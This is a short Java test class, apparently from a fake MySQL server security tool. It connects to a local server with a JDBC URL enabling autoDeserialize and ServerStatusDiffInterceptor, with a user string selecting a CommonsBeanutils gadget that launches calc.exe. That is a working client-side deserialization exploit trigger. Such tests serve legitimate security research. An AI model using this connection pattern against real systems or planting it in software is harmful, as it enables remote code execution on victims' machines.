package me.n1ar4.fake.test.mysql5;

import java.sql.DriverManager;

public class MySQL5CB_S {
    public static void main(String[] args) {
        String url = "jdbc:mysql://127.0.0.1:3308/test?" +
                "autoDeserialize=true&statementInterceptors=" +
                "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CB_calc.exe";
        try {
            Class.forName("com.mysql.jdbc.Driver");
            DriverManager.getConnection(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
